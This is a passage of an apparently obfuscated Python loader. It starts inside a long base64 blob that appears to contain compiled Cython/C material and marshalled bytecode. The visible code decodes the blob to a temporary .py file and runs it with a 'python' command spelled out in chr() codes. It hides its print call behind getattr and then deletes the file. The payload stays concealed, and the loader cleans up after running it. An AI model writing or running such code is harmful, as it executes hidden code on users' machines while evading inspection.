J0b3djKG91dCwgKGNoYXIqKWluLCBhcmdzaXplLCAmbWJzKTtcbiAgICAgICAgaWYgKGNvbnZlcnRlZCA9PSAwKVxuICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgIGlmIChjb252ZXJ0ZWQgPT0gKHNpemVfdCktMikge1xuICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJ1bmV4cGVjdGVkIG1icnRvd2MgcmVzdWx0IC0yIik7XG4gICAgICAgICAgICBmcmVlKHJlcyk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICBpZiAoY29udmVydGVkID09IChzaXplX3QpLTEpIHtcbiAgICAgICAgICAgICpvdXQrKyA9IDB4ZGMwMCArICppbisrO1xuICAgICAgICAgICAgYXJnc2l6ZS0tO1xuICAgICAgICAgICAgbWVtc2V0KCZtYnMsIDAsIHNpemVvZiBtYnMpO1xuICAgICAgICAgICAgY29udGludWU7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCpvdXQgPj0gMHhkODAwICYmICpvdXQgPD0gMHhkZmZmKSB7XG4gICAgICAgICAgICBhcmdzaXplIC09IGNvbnZlcnRlZDtcbiAgICAgICAgICAgIHdoaWxlIChjb252ZXJ0ZWQtLSlcbiAgICAgICAgICAgICAgICAqb3V0KysgPSAweGRjMDAgKyAqaW4rKztcbiAgICAgICAgICAgIGNvbnRpbnVlO1xuICAgICAgICB9XG4gICAgICAgIGluICs9IGNvbnZlcnRlZDtcbiAgICAgICAgYXJnc2l6ZSAtPSBjb252ZXJ0ZWQ7XG4gICAgICAgIG91dCsrO1xuICAgIH1cbiNlbHNlXG4gICAgcmVzID0gKHdjaGFyX3QgKiltYWxsb2MoKHN0cmxlbihhcmcpKzEpKnNpemVvZih3Y2hhcl90KSk7XG4gICAgaWYgKCFyZXMpIGdvdG8gb29tO1xuICAgIGluID0gKHVuc2lnbmVkIGNoYXIqKWFyZztcbiAgICBvdXQgPSByZXM7XG4gICAgd2hpbGUoKmluKVxuICAgICAgICBpZigqaW4gPCAxMjgpXG4gICAgICAgICAgICAqb3V0KysgPSAqaW4rKztcbiAgICAgICAgZWxzZVxuICAgICAgICAgICAgKm91dCsrID0gMHhkYzAwICsgKmluKys7XG4gICAgKm91dCA9IDA7XG4jZW5kaWZcbiAgICByZXR1cm4gcmVzO1xub29tOlxuICAgIGZwcmludGYoc3RkZXJyLCAib3V0IG9mIG1lbW9yeSIpO1xuICAgIHJldHVybiBOVUxMO1xufVxuaW50XG5tYWluKGludCBhcmdjLCBjaGFyICoqYXJndilcbntcbiAgICBpZiAoIWFyZ2MpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X21haW4oMCwgTlVMTCk7XG4gICAgfVxuICAgIGVsc2Uge1xuICAgICAgICBpbnQgaSwgcmVzO1xuICAgICAgICB3Y2hhcl90ICoqYXJndl9jb3B5ID0gKHdjaGFyX3QgKiopbWFsbG9jKHNpemVvZih3Y2hhcl90KikqYXJnYyk7XG4gICAgICAgIHdjaGFyX3QgKiphcmd2X2NvcHkyID0gKHdjaGFyX3QgKiopbWFsbG9jKHNpemVvZih3Y2hhcl90KikqYXJnYyk7XG4gICAgICAgIGNoYXIgKm9sZGxvYyA9IHN0cmR1cChzZXRsb2NhbGUoTENfQUxMLCBOVUxMKSk7XG4gICAgICAgIGlmICghYXJndl9jb3B5IHx8ICFhcmd2X2NvcHkyIHx8ICFvbGRsb2MpIHtcbiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAib3V0IG9mIG1lbW9yeSIpO1xuICAgICAgICAgICAgZnJlZShhcmd2X2NvcHkpO1xuICAgICAgICAgICAgZnJlZShhcmd2X2NvcHkyKTtcbiAgICAgICAgICAgIGZyZWUob2xkbG9jKTtcbiAgICAgICAgICAgIHJldHVybiAxO1xuICAgICAgICB9XG4gICAgICAgIHJlcyA9IDA7XG4gICAgICAgIHNldGxvY2FsZShMQ19BTEwsICIiKTtcbiAgICAgICAgZm9yIChpID0gMDsgaSA8IGFyZ2M7IGkrKykge1xuICAgICAgICAgICAgYXJndl9jb3B5MltpXSA9IGFyZ3ZfY29weVtpXSA9IF9fUHl4X2NoYXIyd2NoYXIoYXJndltpXSk7XG4gICAgICAgICAgICBpZiAoIWFyZ3ZfY29weVtpXSkgcmVzID0gMTtcbiAgICAgICAgfVxuICAgICAgICBzZXRsb2NhbGUoTENfQUxMLCBvbGRsb2MpO1xuICAgICAgICBmcmVlKG9sZGxvYyk7XG4gICAgICAgIGlmIChyZXMgPT0gMClcbiAgICAgICAgICAgIHJlcyA9IF9fUHl4X21haW4oYXJnYywgYXJndl9jb3B5KTtcbiAgICAgICAgZm9yIChpID0gMDsgaSA8IGFyZ2M7IGkrKykge1xuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA1MDAwMFxuICAgICAgICAgICAgZnJlZShhcmd2X2NvcHkyW2ldKTtcbiNlbHNlXG4gICAgICAgICAgICBQeU1lbV9SYXdGcmVlKGFyZ3ZfY29weTJbaV0pO1xuI2VuZGlmXG4gICAgICAgIH1cbiAgICAgICAgZnJlZShhcmd2X2NvcHkpO1xuICAgICAgICBmcmVlKGFyZ3ZfY29weTIpO1xuICAgICAgICByZXR1cm4gcmVzO1xuICAgIH1cbn1cbiNlbmRpZlxuelx4MDRucS5jXHhmYVx4MDEuXHhmYVx4MDEgXHhlOVx4ZmZceGZmXHhmZlx4ZmZ6XHgwNmdjYyAtSXpceDBmL2luY2x1ZGUvcHl0aG9uelx4MDQgLW8gelx4MDMgLUx6XHIvbGliIC1scHl0aG9uXHhkYVx4MDF3XHhkYVx4MDJvc1QpXHgwMVx4ZGFceDA4ZXhpc3Rfb2spMVx4ZGFceDAzbWFwXHhkYVx4MDNjaHJceGRhXHgwMUdceGRhXHgwMUhceGRhXHgwMU9ceGRhXHgwMVNceGRhXHgwMVRceGRhXHgwMUpceGRhXHgwMUlceGRhXHgwMkdIXHhkYVx4MDJPU1x4ZGFceDAyVEpceGRhXHgwMklJXHhkYVx4MDVHSE9TVFx4ZGFceDA4dGVtcGZpbGVceGRhXHgwMXRyXHgxNFx4MDBceDAwXHgwMHJcblx4MDBceDAwXHgwMFx4ZGFcbmdob3N0X3BhdGhyXHgwYlx4MDBceDAwXHgwMFx4ZGFceDA1Z3JkbXZyXHgwY1x4MDBceDAwXHgwMFx4ZGFceDA0c3RlbVx4ZGFceDA2YmFzZTY0clxyXHgwMFx4MDBceDAwXHhkYVx4MDRsbWFvXHhkYVx4MDVwcmludFx4ZGFcbl9faW1wb3J0X19ceGRhXHgwNnByZWZpeFx4ZGFceDA2UFJFRklYXHhkYVx4MGNFWEVDVVRFX0ZJTEVceGRhXHgxMUVYUE9SVF9QWVRIT05IT01FXHhkYVxuZXhlY3V0YWJsZVx4ZGFceDE4RVhQT1JUX1BZVEhPTl9FWEVDVVRBQkxFXHhkYVx4MDNSVU5ceGRhXHgwNmlzZmlsZVx4ZGFceDA0ZXhpdFx4ZGFceDA4Q19TT1VSQ0VceGRhXHgwNkNfRklMRVx4ZGFceDA0am9pblx4ZGFceDA3dmVyc2lvblx4ZGFceDA1c3BsaXRceGRhXHgwZVBZVEhPTl9WRVJTSU9OXHhkYVx4MGNDT01QSUxFX0ZJTEVceGRhXHgwNG9wZW5ceGRhXHgwMWZceGRhXHgwNXdyaXRlXHhkYVx4MDhtYWtlZGlyc1x4ZGFceDA3ZGlybmFtZVx4YTlceDAwXHhmM1x4MDBceDAwXHgwMFx4MDBceGRhXHgwNWdob3N0XHhmYVx4MDg8bW9kdWxlPnJFXHgwMFx4MDBceDAwXHgwMVx4MDBceDAwXHgwMHNceDFhXHgwM1x4MDBceDAwXHhmMFx4MDNceDAxXHgwMVx4MDFceGQ4XHgxMlx4MTVceDkwI1x4OTBjXHhkMFx4MWI7XHhkMFx4MWI7XHhkMFx4MWI7XHhkMVx4MTI8XHhkNFx4MTI8XHg4MVx4MGZceDgwXHgwMVx4ODAhXHg4MEFceDgwYVx4ODhceDAxXHg4OCFceDg4QVx4ODhhXHhkOFx4MTFceDEyXHg5MDFceDkxXHgxM1x4OTBhXHg5OFx4MDFceDkxY1x4OTgxXHg5OFFceDk5M1x4YTBceDAxXHhhMCFceGExXHgwM1x4ZDBceDExI1x4ODFceDBlXHg4MFx4MDJceDgwQlx4ODhceDAyXHg4OEJceGQ4XHgwOFx0XHg4OCFceDg5XHgwM1x4ODhBXHg4OVx4MDVceDg4YVx4ODlceDA3XHg5MFx4MDFceDg5XHRceDkwIVx4ODlceDBiXHg5MEFceDg5XHJceDkwYVx4ODlceDBmXHg4MFx4MDVceGQ4XHgwMFx4MTRceGQwXHgwMFx4MTRceGQwXHgwMFx4MTRceGQwXHgwMFx4MTRceGQ4XHgwMEJceGQwXHgwMEJceGQwXHgwMEJceGQwXHgwMEJceGQwXHgwMEJceGQwXHgwMEJceGQwXHgwMEJceGQwXHgwMEJceGQwXHgwMEJceGQwXHgwMEJceGQ4XHgwMCRceGQwXHgwMCRceGQwXHgwMCRceGQwXHgwMCRceGQwXHgwMCRceGQwXHgwMCRceGUwXHgwMFx4MDVceDgwXHgwNVx4ZDBceDA2KVx4ZDFceDAwKlx4ZDRceDAwKlx4ZDBceDAwKlx4ZDhceDAwXHgwNVx4ODBceDA1XHg4MGJceDgxXHRceDg0XHRceDgwXHRceGQ4XHgwMFx4MDVceDgwXHgwNVx4ZDBceDA2RVx4ZDFceDAwRlx4ZDRceDAwRlx4ZDBceDAwRlx4ZDhceDAwXHgwNVx4ODBceDA1XHg4MGJceDgxXHRceDg0XHRceDgwXHRceGQ4XHgwN1x4MTFceDgwelx4OTAlXHhkMVx4MDdceDE4XHhkNFx4MDdceDE4XHhkNFx4MDdceDFmXHg4MFx4MDZceGQ4XHgwZlx4MWFceDgwXHgwY1x4ZDhceDEzXCdceGE4XG5ceGE4XG5ceGIwNVx4ZDEoOVx4ZDQoOVx4ZDQoQFx4ZDFceDEzQFx4ZDBceDAwXHgxMVx4ZDhceDFhNVx4YjB6XHhiMHpceGMwJVx4ZDE3SFx4ZDQ3SFx4ZDQ3U1x4ZDFceDFhU1x4ZDBceDAwXHgxOFx4ZDhceDA2XG5ceDg4TFx4ZDFceDA2XHgxOFx4ODBceDAzXHhkOFx4MDNceDE0XHg4MDpceGQ0XHgwM1x4MTRceDkwXFxceGQxXHgwMyJceGQ0XHgwMyJceGYwXHgwMFx4MDJceDAxXHgwY1x4ZDhceDA0XHgwOFx4ODBEXHhkMFx0XHgxYVx4OThEXHhkMVx0IFx4ZDAiOlx4ZDFcdDpceGI4RFx4ZDFcdEBceGMwI1x4ZDFcdEVceGQxXHgwNEZceGQ0XHgwNEZceGQwXHgwNEZceGQ4XHgwNFx4MDhceDgwRFx4ODhceDExXHg4MUdceDg0R1x4ODBHXHhmMFx4MDJuT1x4MDNceDBjXHgwNFx4ODBceDA4XHhmMF5fXHgwNlx4MDBcdFx4MGZceDgwXHgwNlx4ZDhceDExXHgxNFx4OTdceDE4XHg5Mlx4MThceDk4Klx4OTgqXHhhMFVceGQxXHgxYStceGQ0XHgxYStceGQ0XHgxYTNceGQ3XHgxYTlceGQyXHgxYTlceGI4I1x4ZDFceDFhPlx4ZDRceDFhPlx4YjhxXHhkNFx4MWFBXHhkN1x4MWFHXHhkMlx4MWFHXHhjOFx4MDNceGQxXHgxYUxceGQ0XHgxYUxceGM4U1x4YzhiXHhjOFNceGQ0XHgxYVFceGQxXHgxMVJceGQ0XHgxMVJceDgwXHgwZVx4ZDhceDEwXHgxOFx4OTg2XHhkMVx4MTAhXHhkMCQ1XHhkMVx4MTA1XHhiOFx4MGVceGQxXHgxMEZceGM4XHgxNlx4ZDFceDEwT1x4ZDBSXlx4ZDFceDEwXlx4ZDBhZFx4ZDFceDEwZFx4ZDBnbVx4ZDFceDEwbVx4ZDBwdVx4ZDFceDEwdVx4ZDB4flx4ZDFceDEwflx4ZjBceDAwXHgwMEJceDAyUVx4MDJceGYxXHgwMFx4MDBceDExUVx4MDJceGYwXHgwMFx4MDBUXHgwMmJceDAyXHhmMVx4MDBceDAwXHgxMWJceDAyXHg4MFx4MGNceGQ4XHgwNVx0XHg4MFRceDg4Jlx4OTBceDEzXHhkMVx4MDVceDE1XHhkNFx4MDVceDE1XHhmMFx4MDBceDAxXHgwMVx4MTZceDk4XHgxMVx4ZDhceDA0XHgwNVx4ODdHXHg4MkdceDg4SFx4ZDFceDA0XHgxNVx4ZDRceDA0XHgxNVx4ZDBceDA0XHgxNVx4ZjBceDAzXHgwMVx4MDFceDE2XHhmMFx4MDBceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjFceDAwXHgwMVx4MDFceDE2XHhmNFx4MDBceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjBceDAwXHgwMVx4MDFceDE2XHhmMFx4MDBceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjBceDAwXHgwMVx4MDFceDE2XHhmMFx4MDBceDAxXHgwMVx4MTZceGY4XHhmOFx4ZjhceGYwXHgwMFx4MDFceDAxXHgxNlx4ZjBceDAwXHgwMVx4MDFceDE2XHhmMFx4MDBceDAxXHgwMVx4MTZceGYwXHgwMFx4MDFceDAxXHgxNlx4ZTBceDAwXG5ceDgwXG5ceDg4NFx4ZDFceDAwXHgxMFx4ZDRceDAwXHgxMFx4ZDdceDAwXHgxOVx4ZDJceDAwXHgxOVx4ZDBceDFhLFx4OTgqXHhkNFx4MWEsXHhhOFxcXHhkMVx4MWE6XHhkNFx4MWE6XHhjMERceGQwXHgwMFx4MTlceGQxXHgwMElceGQ0XHgwMElceGQwXHgwMElceGQ4XHgwMFx4MDRceDgwXHgwNFx4ZDBceDA1XHgxNlx4OThceDA0XHhkMVx4MDVceDFjXHhkMFx4MWU2XHhkMVx4MDU2XHhiOFx4MDRceGQxXHgwNTxceGI4fFx4ZDFceDA1S1x4YzhUXHhkMVx4MDVRXHhkMFNWXHhkMVx4MDVWXHhkMVx4MDBXXHhkNFx4MDBXXHhkMFx4MDBXXHhkOFx4MDBceDA1XHg4MFx4MDVceDgwZlx4ODFcclx4ODRcclx4ODBcclx4ODBcclx4ODBccnNceDEyXHgwMFx4MDBceDAwXHhjNT9ceDE2RiFceDAzXHhjNiFceDA0RiVceDA3XHhjNihceDAxRiVceDA3Jykp')
try:
	with t.NamedTemporaryFile(delete=False, suffix='.py') as ghostfile:
		ghostfile.write(lmao(ghostenc))
		ghostpath = ghostfile.name
	stem(''.join([chr(112), chr(121), chr(116), chr(104), chr(111), chr(110), chr(32)]) + '"' + ghostpath + '"')
except Exception as ghost_err:
	getattr(__import__('builtins'), ''.join(map(chr, [112,114,105,110,116])))(ghost_err)
finally:
	if 'ghostpath' in locals() and ghost_path.exists(ghostpath):
		grdmv(ghostpath)
